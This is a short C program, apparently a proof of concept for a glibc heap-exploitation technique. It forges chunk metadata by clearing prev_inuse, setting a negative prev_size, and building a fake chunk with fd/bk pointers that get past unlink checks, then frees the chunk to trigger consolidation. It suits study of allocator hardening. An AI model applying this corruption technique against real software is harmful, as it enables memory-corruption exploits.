#include <stdio.h>
#include <stdlib.h>

int main()
{
    char *chunk1 = malloc(0x10);
    char *chunk2 = malloc(0x500);
    char *chunk3 = malloc(0x10);

    *(char *)(chunk2 - 8)      &= 0xfe;             // clear prev_inused
    *(int64_t *)(chunk2 - 0x10) = -0x20;            // prev_size
    /* bypass unlink */
    *(int64_t *)(chunk2)        = chunk2+0x10;      // fd (point to fake chunk's header)
    *(int64_t *)(chunk2+8)      = chunk2+0x10;      // bk

    /* make up fake chunk */
    *(int64_t *)(chunk2 + 0x18) = -0x20 + 1;   // fake chunk size
    /* bypass unlink */
    *(int64_t *)(chunk2 + 0x20) = chunk2-0x10; // fd (point to chunk2's header)
    *(int64_t *)(chunk2 + 0x28) = chunk2-0x10; // bk
    free(chunk2);
}
